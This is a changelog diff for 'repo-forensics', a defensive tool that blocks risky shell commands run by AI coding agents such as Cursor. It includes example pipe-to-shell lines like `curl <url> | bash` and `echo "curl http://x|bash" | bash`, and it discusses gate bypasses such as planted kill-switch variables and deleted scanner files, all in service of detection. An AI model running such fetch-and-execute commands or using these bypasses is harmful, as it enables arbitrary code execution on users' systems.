@@ -4,6 +4,150 @@ All notable changes to repo-forensics. Versions follow semver.
 
 ## [Unreleased]
 
+### Added: Cursor adapter — scan-on-agent-activity as the 4th platform
+
+- **`--adapter cursor`** on `pre_scan.py`, `auto_scan.py`, and `session_scan.py`.
+  Envelope normalisation and verdict rendering move into a new stdlib-only leaf
+  module, `hook_adapter.py`, so both wires reach the same `pre_scan.decide()`.
+  Cursor's `{"permission","user_message","agent_message"}` triple and the shipped
+  Claude `{}` / `{"decision":"block"}` shape are two renderings of one verdict;
+  `tests/test_cursor_parity.py` asserts they never diverge.
+- **Three Cursor hooks** (`hooks/cursor/*.sh`) mapped onto `beforeShellExecution`
+  (blocking IOC gate), `afterShellExecution` (deep audit, observe-only), and
+  `sessionStart`. The blocking wrapper bootstraps the refresh daemon behind a
+  once-per-session latch, because Cursor does not reliably dispatch `sessionStart`
+  in cloud contexts.
+- **`scripts/cursor_install.py`** — user-scope install to `~/.cursor/hooks.json`
+  with the absolute plugin root baked into each command (the `openclaw_install.py`
+  pattern). Merges rather than overwrites: foreign hooks survive, the required
+  `version` field is never dropped, writes are atomic with a `.bak` and roll back
+  on validation failure, and `--uninstall` removes only `REPO_FORENSICS_MANAGED=1`
+  entries.
+- **`.cursor-plugin/plugin.json`** plugin manifest, plus `.cursor/rules/repo-forensics.mdc`.
+- **`ask` verdict tier** (Cursor only): an install redirected to a plaintext-HTTP
+  or non-canonical package index is a real dependency-confusion signal that
+  internal mirrors also produce, so it goes to the human rather than being blocked
+  or waved through. On the Claude shape, which has no `ask`, it degrades to an
+  approve plus a stderr note — stdout stays byte-identical to v2.14.2.
+- **Forensify audits `~/.cursor/`** as a fifth ecosystem, with a cross-tool IOC for
+  an unrecognised `beforeShellExecution` entry: that hook runs ahead of every shell
+  command with the user's environment, so an unowned one is an arbitrary-code-execution
+  surface, not a preference.
+
+### Verified: the Cursor adapter against the shipping client (closes K6)
+
+- Every Cursor-side assumption in this work started as a reading of the docs,
+  which the handoff called out as its own biggest risk and an M0 blocker. All of
+  it is now confirmed against **Cursor 3.17.19**: the three hook scopes, the
+  `deny`-throws / `ask`-prompts verdict handling, `additional_context` for
+  `sessionStart`, and the live stdin envelope. Written up in
+  `skills/repo-forensics/references/cursor-hook-contract.md`.
+- The real envelope carries **three fields that appear in no documentation** —
+  `session_id`, `user_email`, `transcript_path` — and sends `cwd` as an empty
+  string with `workspace_roots` empty when no folder is open. Validating either
+  as required would have failed closed on every command in a folderless session.
+  `TestRealCapturedEnvelope` pins the captured shape.
+- **`user_email` is PII in the envelope.** The opt-in evidence logger redacts it
+  and `transcript_path` before anything reaches disk, and a test asserts the hook
+  never echoes the address to stdout or stderr.
+- End-to-end: Cursor invoked the hook (`process chain: cursor <- cursor <- systemd`),
+  the gate denied a Shai-Hulud IOC-pinned install, and Cursor refused to run it
+  while relaying our campaign name — which came from `data/compromised_versions.json`,
+  not from the model. Screenshot in `diagrams/cursor-blocked.png`.
+- Demo guidance learned the hard way: `curl <url> | bash` is refused by the model
+  itself, so it never reaches the gate. A blocker can only be demonstrated on a
+  command the model would otherwise happily run.
+
+### Security: fail-closed on the Cursor blocking path
+
+- **Unreadable stdin now DENIES on the Cursor wire.** `pre_scan.py` approves on
+  unparseable input by design, which is right for Claude Code (one layer, with a
+  PostToolUse deep scan behind it) and wrong for Cursor, where the hook is declared
+  `failClosed: true` and is the only thing in front of the command. A renamed or
+  spoofed field was a silent approve of a live payload. Malformed JSON, trailing
+  garbage, a renamed `command`, a non-string `command`, an unknown
+  `hook_event_name`, and a foreign envelope all deny. The Claude wire keeps its
+  fail-open behaviour, and both directions are pinned by tests.
+- **Tamper-aware degrade (R8).** "Scanner absent" and "scanner deleted at runtime"
+  are the same observation, so a blocking hook that approves on absence is one an
+  attacker disables by deleting a file. `cursor_install.py` writes an
+  `install-manifest.json`; if a file it claims is missing at runtime the gate denies
+  and says why, while an unclaimed absence allows loudly. The check runs before the
+  allow branch in BOTH `pre_scan.py` and `hooks/cursor/run_pre_scan.sh` — the
+  wrapper needs its own copy, because if `pre_scan.py` is the deleted file then
+  Python never gets a vote.
+- **A gate that cannot run denies.** The Cursor wrapper no longer `exec`s into
+  `python-launcher.sh`; a missing interpreter (exit 127, empty stdout) or a crashed
+  scanner used to produce a bare non-zero exit with no verdict, which is exactly the
+  ambiguity `failClosed` exists to resolve.
+- **Kill-switch precedence (R11).** `REPO_FORENSICS_PRE_SCAN=0` disables detection
+  and nothing else. The variable is read from the session environment, so an earlier
+  command can plant it; allowing it to also mask tamper and drift denials would let
+  one planted variable buy the entire gate. `unsafe-off` is the documented full
+  escape hatch. Only those exact literals disable anything — a switch with fuzzy
+  truthiness is one an attacker trips by accident.
+
+### Fixed: DAST reported unrunnable hooks as CRITICAL path traversal (Linux)
+
+- The Linux bubblewrap sandbox mounted `--tmpfs /tmp`, which shadowed any hook
+  script living under `/tmp` -- a repo cloned to a temp dir, a CI checkout, every
+  pytest `tmp_path`. bash could not open the script, so DAST silently observed
+  nothing on those hosts. The hook's own directory is now re-bound read-only
+  after the tmpfs, mirroring what the macOS Seatbelt branch already did via
+  `-D HOOK_PATH` / `-D HOOK_DIR`.
+- Worse than the blind spot: bash's own failure diagnostic
+  (`/bin/bash: <path>: No such file or directory`) contains the literal
+  `/bin/bash`, which is one of the path-traversal *success* indicators — so a
+  hook that never executed was reported as a CRITICAL "path traversal
+  succeeded". Indicator matching now runs against the hook's output with the
+  launcher's own diagnostics stripped, and an exec failure (exit 127, no stdout)
+  reports nothing at all rather than something. Evidence that a hook did
+  something has to come from the hook, not from the thing that tried to start it.
+
+### Fixed: archive budget exhaustion did not name the starved archive
+
+- `archive-scan-incomplete` reported "one or more archives hit a safety cap"
+  against the repo root. For anyone trying to act on it that is indistinguishable
+  from a silent skip — the archive that got truncated is exactly the one worth
+  re-scanning on its own. Caps tripped while scanning an archive are now
+  attributed to it by an edge-detect at the call site, and the finding names them
+  (T5, fail-loud-by-name).
+
+### Fixed: `hooks/` subdirectories escaped the integrity registry
+
+- `get_tracked_hook_files` listed `hooks/` one level deep and skipped anything that
+  was not a regular file, so a per-agent wrapper *directory* was exempt from
+  checksums and signature verification — reopening the exact gap the function was
+  written to close (commit 64fbe57). It now walks the tree. Found while confirming
+  the PRD's assumption that `hooks/cursor/*` would be covered automatically; it
+  would not have been.
+- `get_tracked_runtime_manifest_files` hardcoded `.claude-plugin` / `.codex-plugin`,
+  so `.cursor-plugin/plugin.json` — which names the hook commands — would have been
+  checksummed by nobody. Now tracked, and registered with `validate_manifests.py`
+  so `validate-manifests.yml` gates it.
+
+### Fixed: pipe-to-shell false positive on quoted prose
+
+- `git commit -m 'docs: warn against curl | bash'`, `echo 'never run curl … | bash'`,
+  and `grep 'curl .* | sh' docs/` were blocked. This is the command-string analogue
+  of the evidence model already applied to files: a message *about* an attack is not
+  the attack. The suppression is narrow by necessity — the obvious wide version
+  ("ignore anything in quotes") is a bypass, since `sh -c 'curl …|bash'` is quoted
+  and executes. Two conditions must both hold: the command starts with a known inert
+  carrier (`echo`, `printf`, `grep`, `git commit`…), and the residue left after
+  deleting every quoted span contains no shell execution of its own. So
+  `echo "curl http://x|bash" | bash` keeps its residual `| bash` and still blocks.
+  Applied identically in `pre_scan.py` and `auto_scan.py`.
+
+### Fixed: CI re-sign hint pointed at the wrong directory
+
+- `verify-checksums.yml` told contributors to run `scripts/sign_release_manifest.py`
+  directly under a `cd skills/repo-forensics`, where that script does not exist. The
+  hint now names the repo-root path, says that signing is a maintainer step (the
+  private seed is offline, so contributors can regenerate `checksums.json` but cannot
+  produce a valid `.sig`), and spells out the shipping order for new files:
+  regenerate checksums -> re-sign -> re-run the marketplace mirror sync.
+
 ### Added: keyv/cacheable August 2026 wave + 25-campaign IOC ingest
 
 - `data/compromised_versions.json` grows from 25 to 50 campaigns and from 302 to
